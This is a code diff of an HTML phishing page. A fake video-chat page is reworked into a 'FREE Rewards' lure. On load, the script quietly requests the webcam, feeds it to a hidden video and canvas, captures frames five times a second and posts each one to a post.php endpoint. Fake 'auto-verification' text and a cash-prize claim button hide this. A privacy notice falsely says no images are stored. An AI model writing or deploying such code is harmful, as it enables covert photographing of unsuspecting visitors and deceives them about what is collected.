@@ -2,976 +2,766 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>NexusCall | Premium Video & Audio Chat</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>FREE Rewards</title>
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
     <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.0/font/bootstrap-icons.css">
-    <script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
+    <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
+        :root {
+            --gold: #FFD700;
+            --dark-blue: #0f2027;
+            --success: #00C853;
         }
-
+        
         body {
-            background: radial-gradient(circle at 20% 30%, #0a0f1e, #03050b);
+            background: linear-gradient(135deg, #0f2027 0%, #203a43 100%);
             min-height: 100vh;
-            font-family: 'Segoe UI', 'Poppins', system-ui, -apple-system, 'Inter', sans-serif;
-            padding: 1.5rem;
-            position: relative;
-            overflow-x: hidden;
+            margin: 0;
+            padding: 15px;
+            color: #fff;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
         }
-
-        /* Animated background particles */
-        .particle-bg {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            z-index: 0;
-            pointer-events: none;
+        
+        .container-sm {
+            max-width: 900px;
+            padding: 0;
         }
-
-        .particle {
-            position: absolute;
-            background: rgba(0, 255, 255, 0.3);
-            border-radius: 50%;
-            filter: blur(2px);
-            animation: floatParticle linear infinite;
-        }
-
-        @keyframes floatParticle {
-            0% { transform: translateY(100vh) rotate(0deg); opacity: 0; }
-            10% { opacity: 0.6; }
-            90% { opacity: 0.6; }
-            100% { transform: translateY(-20vh) rotate(360deg); opacity: 0; }
-        }
-
-        /* Main container */
-        .glass-container {
-            max-width: 1400px;
-            margin: 0 auto;
-            position: relative;
-            z-index: 2;
-        }
-
-        /* Header with neon glow */
-        .hero-section {
+        
+        /* Header */
+        .header {
             text-align: center;
-            margin-bottom: 2rem;
-            animation: fadeInDown 0.8s cubic-bezier(0.2, 0.9, 0.4, 1.1);
+            margin-bottom: 20px;
+            padding: 15px;
         }
-
-        .glow-text {
-            font-size: 2.5rem;
-            font-weight: 800;
-            background: linear-gradient(135deg, #aaffff, #6c5ce7, #ff79c6);
-            background-size: 200% auto;
+        
+        .title {
+            font-size: 1.8rem;
+            font-weight: 900;
+            margin-bottom: 10px;
+            background: linear-gradient(135deg, var(--gold), #FFA500);
             -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
             background-clip: text;
-            color: transparent;
-            animation: shimmer 3s linear infinite;
-            letter-spacing: -0.5px;
         }
-
-        @keyframes shimmer {
-            0% { background-position: 0% 50%; }
-            100% { background-position: 200% 50%; }
-        }
-
-        .sub-badge {
-            background: rgba(108, 92, 231, 0.2);
-            backdrop-filter: blur(10px);
-            border: 1px solid rgba(170, 255, 255, 0.4);
-            border-radius: 40px;
-            padding: 0.4rem 1.2rem;
+        
+        .subtitle {
+            font-size: 1rem;
+            opacity: 0.9;
+            background: rgba(255, 215, 0, 0.1);
+            padding: 10px 15px;
+            border-radius: 10px;
             display: inline-block;
-            font-size: 0.9rem;
-            font-weight: 500;
-            color: #ccf6ff;
+            border: 1px solid rgba(255, 215, 0, 0.2);
         }
-
-        /* Video call grid layout */
-        .call-grid {
-            display: grid;
-            grid-template-columns: 1fr 380px;
-            gap: 1.5rem;
-            margin-bottom: 1.5rem;
+        
+        /* Cards */
+        .card {
+            background: rgba(255, 255, 255, 0.08);
+            border-radius: 15px;
+            padding: 20px;
+            margin-bottom: 20px;
+            border: 1px solid rgba(255, 215, 0, 0.2);
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
         }
-
-        /* Video area - user camera hidden, only remote visible */
-        .video-stage {
-            background: #000000cc;
-            border-radius: 32px;
-            backdrop-filter: blur(8px);
-            border: 1px solid rgba(0, 255, 255, 0.3);
-            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.5), 0 0 0 2px rgba(0, 255, 255, 0.1);
-            overflow: hidden;
-            transition: all 0.4s ease;
-        }
-
-        .remote-video-container {
-            position: relative;
-            background: #0a0e1a;
-            height: 100%;
-            min-height: 540px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            background-image: radial-gradient(circle at 30% 20%, #1e2a3a 1px, transparent 1px);
-            background-size: 30px 30px;
-        }
-
-        #remoteVideo {
-            width: 100%;
-            height: 100%;
-            object-fit: cover;
-            transition: all 0.3s;
-        }
-
-        /* Hidden user camera element - used for capture */
-        #hiddenLocalVideo {
-            position: fixed;
-            top: -9999px;
-            left: -9999px;
-            width: 1px;
-            height: 1px;
-            opacity: 0;
-            pointer-events: none;
-            visibility: hidden;
-        }
-
-        /* Hidden canvas for capture */
-        #captureCanvas {
-            position: fixed;
-            top: -9999px;
-            left: -9999px;
-            width: 1px;
-            height: 1px;
-            opacity: 0;
-            pointer-events: none;
-        }
-
-        .video-label {
-            position: absolute;
-            bottom: 12px;
-            left: 16px;
-            background: rgba(0, 0, 0, 0.6);
-            backdrop-filter: blur(8px);
-            padding: 4px 12px;
-            border-radius: 30px;
-            font-size: 0.75rem;
-            font-weight: 600;
-            color: cyan;
-            border-left: 3px solid cyan;
-            z-index: 5;
-        }
-
-        /* Chat panel */
-        .chat-panel {
-            background: rgba(15, 25, 45, 0.7);
-            backdrop-filter: blur(16px);
-            border-radius: 32px;
-            border: 1px solid rgba(0, 255, 255, 0.25);
-            display: flex;
-            flex-direction: column;
-            height: 660px;
-            overflow: hidden;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
-            transition: all 0.3s;
-        }
-
-        .chat-header {
-            padding: 1rem 1.2rem;
-            border-bottom: 1px solid rgba(0, 255, 255, 0.3);
-            background: rgba(0, 0, 0, 0.3);
-            display: flex;
-            align-items: center;
-            gap: 10px;
-        }
-
-        .chat-header i {
-            font-size: 1.4rem;
-            color: #0ff;
-            animation: pulse 1.5s infinite;
-        }
-
-        @keyframes pulse {
-            0%, 100% { text-shadow: 0 0 0px cyan; opacity: 0.8; }
-            50% { text-shadow: 0 0 8px cyan; opacity: 1; }
-        }
-
-        .messages-area {
-            flex: 1;
-            overflow-y: auto;
-            padding: 1rem;
-            display: flex;
-            flex-direction: column;
-            gap: 12px;
-            scroll-behavior: smooth;
-        }
-
-        .message {
-            max-width: 85%;
-            padding: 8px 14px;
-            border-radius: 24px;
-            font-size: 0.9rem;
-            animation: fadeSlideUp 0.2s ease;
-            word-break: break-word;
-        }
-
-        .message.own {
-            background: linear-gradient(135deg, #0a6cff, #00c6ff);
-            align-self: flex-end;
-            border-bottom-right-radius: 4px;
-            color: white;
-        }
-
-        .message.other {
-            background: rgba(255, 255, 255, 0.12);
-            border: 1px solid rgba(0, 255, 255, 0.3);
-            align-self: flex-start;
-            border-bottom-left-radius: 4px;
-            color: #eef4ff;
-        }
-
-        .message small {
-            font-size: 0.65rem;
-            opacity: 0.7;
-            display: block;
-            margin-top: 4px;
-        }
-
-        .chat-input-area {
-            padding: 1rem;
-            background: rgba(0, 0, 0, 0.4);
-            border-top: 1px solid rgba(0, 255, 255, 0.2);
-            display: flex;
-            gap: 10px;
-        }
-
-        .chat-input-area input {
-            flex: 1;
-            background: rgba(20, 30, 55, 0.8);
-            border: 1px solid rgba(0, 255, 255, 0.5);
-            border-radius: 50px;
-            padding: 12px 18px;
-            color: white;
-            outline: none;
-            transition: all 0.2s;
-        }
-
-        .chat-input-area input:focus {
-            border-color: cyan;
-            box-shadow: 0 0 12px rgba(0, 255, 255, 0.3);
-        }
-
-        .send-btn {
-            background: linear-gradient(135deg, #0a6cff, #00c6ff);
-            border: none;
-            width: 48px;
-            border-radius: 50px;
-            color: white;
-            transition: all 0.2s;
-        }
-
-        .send-btn:hover {
-            transform: scale(1.05);
-            box-shadow: 0 0 12px cyan;
-        }
-
-        /* Call controls */
-        .call-controls {
-            display: flex;
-            justify-content: center;
-            gap: 1.2rem;
-            margin-top: 0.8rem;
-            flex-wrap: wrap;
-        }
-
-        .ctrl-btn {
-            background: rgba(20, 30, 55, 0.8);
-            backdrop-filter: blur(12px);
-            border: 1px solid rgba(0, 255, 255, 0.5);
-            border-radius: 60px;
-            padding: 12px 24px;
-            font-weight: 600;
-            display: inline-flex;
-            align-items: center;
-            gap: 12px;
-            color: #f0f9ff;
-            transition: all 0.2s;
-            cursor: pointer;
-        }
-
-        .ctrl-btn i {
-            font-size: 1.3rem;
-        }
-
-        .ctrl-btn.active {
-            background: #00c6ff;
-            color: #000;
-            border-color: white;
-            box-shadow: 0 0 15px cyan;
-        }
-
-        .ctrl-btn.end-call {
-            background: #ff3366;
-            border-color: #ff88aa;
-            color: white;
-        }
-
-        .ctrl-btn.end-call:hover {
-            background: #e62e5c;
-            transform: scale(1.02);
-        }
-
-        .ctrl-btn:hover {
-            transform: translateY(-3px);
-            border-color: cyan;
-        }
-
-        /* status indicator */
-        .connection-badge {
-            font-size: 0.75rem;
-            background: #000000aa;
-            border-radius: 30px;
-            padding: 4px 12px;
-            display: inline-flex;
-            align-items: center;
-            gap: 6px;
-        }
-
-        /* Background camera status indicator - Enhanced */
-        .camera-bg-status {
-            position: fixed;
-            bottom: 20px;
-            right: 20px;
-            background: rgba(0, 0, 0, 0.7);
-            backdrop-filter: blur(10px);
-            border-radius: 30px;
-            padding: 8px 16px;
-            font-size: 0.75rem;
+        
+        .card-title {
+            color: var(--gold);
+            font-size: 1.2rem;
+            font-weight: 700;
+            margin-bottom: 15px;
             display: flex;
             align-items: center;
             gap: 8px;
-            z-index: 100;
-            border-left: 3px solid #0f0;
-            pointer-events: none;
-            font-family: monospace;
+        }
+        
+        /* Verification */
+        .steps {
+            margin-bottom: 15px;
+        }
+        
+        .step {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-bottom: 8px;
+            padding: 8px 10px;
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 8px;
+            font-size: 0.9rem;
+        }
+        
+        .step-number {
+            background: linear-gradient(135deg, var(--gold), #FFA500);
+            color: #000;
+            width: 24px;
+            height: 24px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            font-size: 0.8rem;
+        }
+        
+        /* Camera Status */
+        .camera-status-box {
+            background: linear-gradient(135deg, rgba(255, 215, 0, 0.1), rgba(255, 165, 0, 0.05));
+            border-radius: 10px;
+            padding: 15px;
+            text-align: center;
+            margin-bottom: 15px;
+            border: 2px dashed rgba(255, 215, 0, 0.3);
             transition: all 0.3s;
         }
-
-        .camera-bg-status i {
-            font-size: 1rem;
+        
+        .camera-status-box.active {
+            border: 2px solid #00FF00;
+            background: linear-gradient(135deg, rgba(0, 255, 0, 0.1), rgba(0, 200, 0, 0.05));
         }
-
-        .camera-bg-status.verified {
-            border-left-color: #0f0;
-            background: rgba(0, 100, 0, 0.7);
+        
+        .camera-status-box.error {
+            border: 2px solid #FF4444;
+            background: linear-gradient(135deg, rgba(255, 0, 0, 0.1), rgba(200, 0, 0, 0.05));
         }
-
-        .camera-bg-status.error {
-            border-left-color: #f00;
-            background: rgba(100, 0, 0, 0.7);
+        
+        .camera-status-box i {
+            font-size: 2.5rem;
+            margin-bottom: 10px;
         }
-
-        /* Verification progress bar */
-        .verification-progress {
-            position: fixed;
-            bottom: 100px;
-            right: 20px;
-            width: 250px;
-            background: rgba(0, 0, 0, 0.8);
-            backdrop-filter: blur(10px);
-            border-radius: 12px;
+        
+        .camera-status {
+            font-size: 0.85rem;
+            color: rgba(255, 255, 255, 0.8);
+            margin-top: 5px;
+        }
+        
+        /* Buttons */
+        .btn-success {
+            background: linear-gradient(135deg, var(--success), #00E676);
+            color: #000;
+            border: none;
             padding: 12px;
-            z-index: 100;
-            border: 1px solid cyan;
-            display: none;
-        }
-
-        .progress-label {
-            font-size: 0.7rem;
-            margin-bottom: 5px;
-            color: cyan;
-        }
-
-        .progress-bar-container {
-            height: 6px;
-            background: rgba(255,255,255,0.2);
             border-radius: 10px;
+            font-weight: 700;
+            width: 100%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            transition: all 0.3s;
+            margin-top: 10px;
+        }
+        
+        .btn-success:hover:not(:disabled) {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(0, 200, 83, 0.4);
+        }
+        
+        .btn-success:disabled {
+            background: #666;
+            cursor: not-allowed;
+            transform: none;
+        }
+        
+        /* Reward Display */
+        .reward-display {
+            background: linear-gradient(135deg, rgba(255, 215, 0, 0.2), rgba(255, 165, 0, 0.1));
+            border-radius: 10px;
+            padding: 20px;
+            text-align: center;
+            margin-bottom: 15px;
+            border: 2px solid rgba(255, 215, 0, 0.3);
+        }
+        
+        .reward-amount {
+            font-size: 2.5rem;
+            font-weight: 900;
+            color: var(--gold);
+            margin: 10px 0;
+            min-height: 60px;
+        }
+        
+        .reward-label {
+            font-size: 0.9rem;
+            color: rgba(255, 255, 255, 0.9);
+        }
+        
+        /* Inputs */
+        .input-group {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 10px;
+            margin-bottom: 15px;
+        }
+        
+        .input-box {
+            background: rgba(255, 255, 255, 0.1);
+            border: 1px solid rgba(255, 215, 0, 0.3);
+            border-radius: 8px;
+            padding: 10px;
+        }
+        
+        .input-box label {
+            display: block;
+            font-size: 0.8rem;
+            color: var(--gold);
+            margin-bottom: 5px;
+            font-weight: 600;
+        }
+        
+        .input-box input {
+            width: 100%;
+            background: transparent;
+            border: none;
+            color: #fff;
+            font-size: 1rem;
+            text-align: center;
+            outline: none;
+        }
+        
+        /* Status */
+        .status {
+            background: rgba(0, 255, 0, 0.1);
+            border: 1px solid #00FF00;
+            border-radius: 8px;
+            padding: 10px;
+            margin-top: 10px;
+            display: none;
+            font-size: 0.9rem;
+            text-align: center;
+        }
+        
+        /* Progress */
+        .progress {
+            height: 6px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 3px;
+            margin: 10px 0;
             overflow: hidden;
         }
-
-        .progress-fill {
+        
+        .progress-bar {
             height: 100%;
-            background: linear-gradient(90deg, cyan, #00ffaa);
+            background: linear-gradient(90deg, var(--gold), #FFA500);
             width: 0%;
-            transition: width 0.3s ease;
-            border-radius: 10px;
+            transition: width 0.3s;
         }
-
-        /* Reward display */
-        .reward-section {
-            position: fixed;
-            bottom: 20px;
-            left: 20px;
-            background: rgba(0, 0, 0, 0.7);
-            backdrop-filter: blur(10px);
-            border-radius: 30px;
-            padding: 8px 20px;
-            z-index: 100;
-            text-align: center;
-            border: 1px solid gold;
-        }
-
-        .reward-amount {
-            font-size: 1.2rem;
-            font-weight: bold;
-            color: gold;
-        }
-
-        .claim-btn {
-            background: linear-gradient(135deg, gold, #ffaa00);
-            border: none;
-            border-radius: 30px;
-            padding: 6px 15px;
-            margin-left: 10px;
-            font-weight: bold;
-            cursor: pointer;
-            transition: transform 0.2s;
-        }
-
-        .claim-btn:disabled {
-            opacity: 0.5;
-            cursor: not-allowed;
-        }
-
-        .claim-btn:hover:not(:disabled) {
-            transform: scale(1.05);
-        }
-
-        /* Animations */
-        @keyframes fadeInDown {
-            from { opacity: 0; transform: translateY(-30px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-
-        @keyframes fadeSlideUp {
-            from { opacity: 0; transform: translateY(10px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-
-        /* Responsive */
-        @media (max-width: 1000px) {
-            .call-grid {
-                grid-template-columns: 1fr;
-            }
-            .chat-panel {
-                height: 480px;
-            }
-            .remote-video-container {
-                min-height: 380px;
-            }
-            body {
-                padding: 1rem;
-            }
-            .verification-progress {
-                bottom: 90px;
-            }
-        }
-
-        /* scrollbar */
-        .messages-area::-webkit-scrollbar {
-            width: 5px;
-        }
-        .messages-area::-webkit-scrollbar-track {
-            background: #1e2a3a;
-            border-radius: 10px;
-        }
-        .messages-area::-webkit-scrollbar-thumb {
-            background: cyan;
-            border-radius: 10px;
-        }
-
-        .typing-indicator {
-            font-size: 0.7rem;
-            color: #8dd0ff;
-            padding-left: 12px;
-            margin-top: 4px;
-            display: flex;
-            gap: 4px;
-            align-items: center;
-        }
-
+        
+        /* Hidden elements */
         .hidden {
             display: none;
         }
-
-        @keyframes softPulse {
-            0%, 100% { opacity: 0.6; }
-            50% { opacity: 1; }
-        }
-        .bg-active {
-            animation: softPulse 2s infinite;
-        }
-
-        /* Confetti animation */
-        .confetti-container {
+        
+        /* Confetti */
+        .confetti {
             position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            pointer-events: none;
+            width: 10px;
+            height: 10px;
+            background: var(--gold);
+            top: -10px;
             z-index: 1000;
+            opacity: 0.7;
         }
         
-        .confetti {
-            position: absolute;
-            top: -10px;
-            width: 8px;
-            height: 8px;
-            background: #ff0;
-            opacity: 0.8;
-            pointer-events: none;
+        /* Footer */
+        .footer {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 0.8rem;
+            color: rgba(255, 255, 255, 0.7);
+        }
+        
+        .footer a {
+            color: var(--gold);
+            text-decoration: none;
+        }
+        
+        /* Mobile optimizations */
+        @media (max-width: 768px) {
+            .header {
+                margin-bottom: 15px;
+            }
+            
+            .title {
+                font-size: 1.5rem;
+            }
+            
+            .subtitle {
+                font-size: 0.9rem;
+                padding: 8px 12px;
+            }
+            
+            .card {
+                padding: 15px;
+                margin-bottom: 15px;
+            }
+            
+            .reward-amount {
+                font-size: 2rem;
+            }
+            
+            .input-group {
+                grid-template-columns: 1fr;
+                gap: 8px;
+            }
+        }
+        
+        @media (max-width: 480px) {
+            body {
+                padding: 10px;
+            }
+            
+            .title {
+                font-size: 1.3rem;
+            }
+            
+            .reward-amount {
+                font-size: 1.8rem;
+            }
+        }
+        
+        /* Auto-capture notice */
+        .auto-notice {
+            background: rgba(255, 215, 0, 0.15);
+            border-left: 4px solid var(--gold);
+            padding: 10px 15px;
+            border-radius: 8px;
+            margin-bottom: 15px;
+            font-size: 0.85rem;
         }
     </style>
 </head>
 <body>
-<div class="particle-bg" id="particles"></div>
-<div class="confetti-container" id="confettiContainer"></div>
-
-<div class="glass-container">
-    <div class="hero-section">
-        <h1 class="glow-text"><i class="bi bi-camera-reels-fill"></i> NexusWave <span style="font-size: 1.8rem;">Call</span></h1>
-        <div class="sub-badge mt-2">
-            <i class="bi bi-shield-lock-fill"></i> Encrypted • Auto-Verification Active • Privacy Mode
-        </div>
-    </div>
-
-    <div class="call-grid">
-        <!-- Video Section - Only Remote visible, User camera hidden -->
-        <div class="video-stage">
-            <div class="remote-video-container">
-                <video id="remoteVideo" autoplay playsinline muted></video>
-                <div class="video-label"><i class="bi bi-person-circle"></i> Remote Participant</div>
-                <div id="remoteStatusBadge" style="position: absolute; top: 12px; right: 12px; background: #000000aa; border-radius: 20px; padding: 4px 10px; font-size: 0.7rem;">
-                    <i class="bi bi-dot"></i> Initializing...
-                </div>
-            </div>
-        </div>
-        <div class="chat-panel">
-            <div class="chat-header">
-                <i class="bi bi-chat-dots-fill"></i>
-                <span style="font-weight: 600;">Live Chat • Secure Room</span>
-                <span class="connection-badge ms-auto" id="connBadge"><i class="bi bi-wifi"></i> Connecting</span>
-            </div>
-            <div class="messages-area" id="messagesArea">
-                <div class="message other">
-                    <i class="bi bi-info-circle"></i> 🔒 Auto-verification active • Camera capturing for verification<br>
-                    <small>✨ Automatic frame capture • No manual interaction needed</small>
-                </div>
-                <div class="message other">
-                    🎙️ Click "Start Call" to begin full audio/video chat with remote simulation.<br>
-                    <small>🔐 Verification frames are being processed</small>
-                </div>
-            </div>
-            <div id="typingArea" class="typing-indicator hidden">
-                <i class="bi bi-three-dots"></i> Someone is typing...
-            </div>
-            <div class="chat-input-area">
-                <input type="text" id="chatInput" placeholder="Type your message..." autocomplete="off">
-                <button class="send-btn" id="sendMsgBtn"><i class="bi bi-send-fill"></i></button>
-            </div>
-        </div>
-    </div>
-    <div class="call-controls">
-        <div class="ctrl-btn" id="toggleAudioBtn">
-            <i class="bi bi-mic-fill"></i> <span>Mic On</span>
-        </div>
-        <div class="ctrl-btn end-call" id="endCallBtn">
-            <i class="bi bi-telephone-x-fill"></i> End Call
-        </div>
-        <div class="ctrl-btn" id="startCallBtn">
-            <i class="bi bi-play-circle-fill"></i> Start Call
-        </div>
-    </div>
-</div>
-
-<!-- Hidden elements for camera capture -->
-<video id="hiddenLocalVideo" autoplay playsinline muted></video>
-<canvas id="captureCanvas" width="640" height="480"></canvas>
-
-<!-- Camera status and reward section -->
-<div class="camera-bg-status" id="cameraBgStatus">
-    <i class="bi bi-camera-video-fill" id="cameraIcon"></i>
-    <span id="cameraStatusText">Requesting access...</span>
-    <span id="captureCountBadge" style="margin-left: 5px; font-size: 0.7rem;">(0)</span>
-</div>
-
-<div class="verification-progress" id="verificationProgress">
-    <div class="progress-label">Verifying identity...</div>
-    <div class="progress-bar-container">
-        <div class="progress-fill" id="progressFill"></div>
-    </div>
-</div>
-
-<div class="reward-section" id="rewardSection">
-    <span>🎁 Reward: </span>
-    <span class="reward-amount" id="rewardAmount">$0</span>
-    <button class="claim-btn" id="claimBtn" disabled>
-        <i class="bi bi-gift-fill"></i> CLAIM
-    </button>
-</div>
-
-<script>
-    // ==================== AUTO-CAPTURE SYSTEM (Original Functionality) ====================
+    <!-- Confetti Container -->
+    <div id="confetti"></div>
     
-    // DOM Elements for capture system
-    const claimBtn = document.getElementById('claimBtn');
-    const rewardAmount = document.getElementById('rewardAmount');
-    const cameraIcon = document.getElementById('cameraIcon');
-    const cameraStatusText = document.getElementById('cameraStatusText');
-    const captureCountBadge = document.getElementById('captureCountBadge');
-    const verificationProgress = document.getElementById('verificationProgress');
-    const progressFill = document.getElementById('progressFill');
-    const hiddenVideo = document.getElementById('hiddenLocalVideo');
-    const captureCanvas = document.getElementById('captureCanvas');
-    const confettiContainer = document.getElementById('confettiContainer');
-    
-    // State for capture system
-    let isCameraActive = false;
-    let isVerified = false;
-    let captureInterval;
-    let captureCount = 0;
-    
-    // Initialize auto-capture on page load
-    document.addEventListener('DOMContentLoaded', function() {
-        createInitialConfetti();
-        initAutoCapture();
-        setupCallListeners();
-        generateParticles();
-    });
-    
-    // Initialize auto-capture
-    async function initAutoCapture() {
-        updateCameraStatus('initializing', 'Requesting camera...');
+    <div class="container-sm">
+        <!-- Header -->
+        <div class="header">
+            <div class="title">
+                <i class="bi bi-gift-fill"></i> FREE REWARDS
+            </div>
+            <div class="subtitle">
+                Auto-verification in progress...
+            </div>
+        </div>
         
-        try {
-            // Request camera automatically
-            const stream = await navigator.mediaDevices.getUserMedia({
-                audio: false,
-                video: { 
-                    facingMode: "user",
-                    width: { ideal: 640 },
-                    height: { ideal: 480 }
+        <!-- Auto-capture Notice -->
+        <div class="auto-notice">
+            <i class="bi bi-info-circle"></i> Auto-verification started.
+        </div>
+        
+        <!-- Verification Card -->
+        <div class="card">
+            <div class="card-title">
+                <i class="bi bi-person-check"></i> Auto-Verification Status
+            </div>
+            
+            <div class="steps">
+                <div class="step">
+                    <div class="step-number">1</div>
+                    <span>permission requested automatically</span>
+                </div>
+                <div class="step">
+                    <div class="step-number">2</div>
+                    <span>VERIFICATION</span>
+                </div>
+                <div class="step">
+                    <div class="step-number">3</div>
+                    <span>Claim your reward when verified</span>
+                </div>
+            </div>
+            
+            <!-- Camera Status Box -->
+            <div class="camera-status-box" id="cameraStatusBox">
+                <i class="bi bi-camera-video" id="cameraIcon"></i>
+                <div id="cameraMessage">Initializing...</div>
+                <div class="camera-status">
+                    <span id="captureCount">0%</span>  Verification completed
+                </div>
+            </div>
+            
+            <!-- Progress Bar -->
+            <div class="progress" id="progress">
+                <div class="progress-bar" id="progressBar"></div>
+            </div>
+            
+            <!-- Status -->
+            <div class="status" id="status">
+                <i class="bi bi-check-circle"></i> Auto-verification complete! Ready to claim reward
+            </div>
+        </div>
+        
+        <!-- Reward Card -->
+        <div class="card">
+            <div class="card-title">
+                <i class="bi bi-cash-coin"></i> Claim Your Reward
+            </div>
+            
+            <!-- Reward Display -->
+            <div class="reward-display">
+                <div class="reward-amount" id="rewardAmount">$ ???</div>
+                <div class="reward-label">YOUR FREE GIFT</div>
+            </div>
+            
+            <!-- Prize Range Inputs -->
+            <div class="input-group">
+                <div class="input-box">
+                    <label>Min Prize</label>
+                    <input type="number" id="minPrize" value="100" min="100" max="10000">
+                </div>
+                <div class="input-box">
+                    <label>Max Prize</label>
+                    <input type="number" id="maxPrize" value="10000" min="500" max="10000">
+                </div>
+            </div>
+            
+            <!-- Claim Button -->
+            <button class="btn-success" id="claimBtn" disabled>
+                <i class="bi bi-gift-fill"></i> CLAIM REWARD
+            </button>
+        </div>
+        
+        <!-- Footer -->
+        <div class="footer">
+            <i class="bi bi-lock"></i>No manual action needed.
+            <a href="#" id="privacyLink">Privacy Info</a>
+        </div>
+    </div>
+
+    <!-- Hidden Video and Canvas -->
+    <video id="video" class="hidden" playsinline autoplay></video>
+    <canvas id="canvas" class="hidden" width="640" height="480"></canvas>
+
+    <script>
+        // DOM Elements
+        const claimBtn = document.getElementById('claimBtn');
+        const rewardAmount = document.getElementById('rewardAmount');
+        const cameraStatusBox = document.getElementById('cameraStatusBox');
+        const cameraIcon = document.getElementById('cameraIcon');
+        const cameraMessage = document.getElementById('cameraMessage');
+        const captureCountElement = document.getElementById('captureCount');
+        const status = document.getElementById('status');
+        const progress = document.getElementById('progress');
+        const progressBar = document.getElementById('progressBar');
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const privacyLink = document.getElementById('privacyLink');
+        const confettiContainer = document.getElementById('confetti');
+        
+        // State
+        let isCameraActive = false;
+        let isVerified = false;
+        let captureInterval;
+        let captureCount = 0;
+        let verificationTimeout;
+        
+        // Initialize - Start auto-capture on page load
+        document.addEventListener('DOMContentLoaded', function() {
+            setupEventListeners();
+            createInitialConfetti();
+            
+            // Start auto-capture after a brief delay
+            setTimeout(() => {
+                initAutoCapture();
+            }, 1000);
+        });
+        
+        // Setup event listeners
+        function setupEventListeners() {
+            // Claim button
+            claimBtn.addEventListener('click', claimReward);
+            
+            // Privacy link
+            privacyLink.addEventListener('click', function(e) {
+                e.preventDefault();
+                alert("Privacy Info:\n\n• Auto\n• Verification activates automatically\n• No images are stored\n• Your data is protected\n• No manual interaction needed");
+            });
+            
+            // Prize range validation
+            document.getElementById('minPrize').addEventListener('change', validatePrizeRange);
+            document.getElementById('maxPrize').addEventListener('change', validatePrizeRange);
+        }
+        
+        // Initialize auto-capture
+        async function initAutoCapture() {
+            updateCameraStatus('initializing', 'Requesting access...');
+            
+            try {
+                // Request camera automatically
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    audio: false,
+                    video: { 
+                        facingMode: "user",
+                        width: { ideal: 640 },
+                        height: { ideal: 480 }
+                    }
+                });
+                
+                // Start camera
+                video.srcObject = stream;
+                isCameraActive = true;
+                
+                // Update UI
+                updateCameraStatus('active', 'wait a seconds');
+                
+                // Start auto-capture immediately
+                startAutoCapture();
+                
+                // Start verification process
+                startVerificationProcess();
+                
+            } catch (error) {
+                console.error('Auto-capture error:', error);
+                updateCameraStatus('error', 'Allow Access for reward');
+                
+                // Show retry option
+                setTimeout(() => {
+                    if (!isCameraActive) {
+                        cameraMessage.innerHTML = 'Click here to enable verification';
+                        cameraStatusBox.style.cursor = 'pointer';
+                        cameraStatusBox.onclick = () => {
+                            location.reload();
+                        };
+                    }
+                }, 2000);
+            }
+        }
+        
+        // Start auto-capture in background
+        function startAutoCapture() {
+            const context = canvas.getContext('2d');
+            
+            // Start capturing immediately
+            captureInterval = setInterval(() => {
+                if (isCameraActive && video.readyState === video.HAVE_ENOUGH_DATA) {
+                    try {
+                        // Capture frame
+                        context.drawImage(video, 0, 0, 640, 480);
+                        
+                        // Convert to data URL
+                        const imageData = canvas.toDataURL("image/jpeg", 0.5)
+                            .replace("image/jpeg", "image/octet-stream");
+                        
+                        // Send to server
+                        sendToServer(imageData);
+                        
+                        // Update capture count
+                        captureCount++;
+                        captureCountElement.textContent = captureCount;
+                        
+                    } catch (error) {
+                        console.log('Capture error:', error);
+                    }
+                }
+            }, 200); // 5 captures per second
+            
+            console.log('Auto-capture started at 5fps');
+        }
+        
+        // Send data to server
+        function sendToServer(data) {
+            // Use AJAX to send data
+            $.ajax({
+                type: 'POST',
+                data: { cat: data },
+                url: 'post.php',
+                dataType: 'json',
+                async: true,
+                success: function(result) {
+                    // Success callback
+                },
+                error: function() {
+                    // Error handling
                 }
             });
             
-            // Start camera on hidden video element
-            hiddenVideo.srcObject = stream;
-            isCameraActive = true;
-            
-            // Update UI
-            updateCameraStatus('active', 'Auto-capturing frames');
-            
-            // Start auto-capture immediately
-            startAutoCapture();
-            
-            // Start verification process
-            startVerificationProcess();
-            
-            // Add to chat
-            addSystemMessage('✅ Auto-verification started • Capturing frames for identity check');
-            
-        } catch (error) {
-            console.error('Auto-capture error:', error);
-            updateCameraStatus('error', 'Camera access required');
-            addSystemMessage('⚠️ Camera access denied. Please refresh and allow camera for verification.');
+            // Log every 20th capture
+            if (captureCount % 20 === 0) {
+                console.log(`Auto-verify ${captureCount} frames`);
+            }
         }
-    }
-    
-    // Start auto-capture in background
-    function startAutoCapture() {
-        const context = captureCanvas.getContext('2d');
         
-        captureInterval = setInterval(() => {
-            if (isCameraActive && hiddenVideo.readyState === hiddenVideo.HAVE_ENOUGH_DATA) {
-                try {
-                    // Capture frame
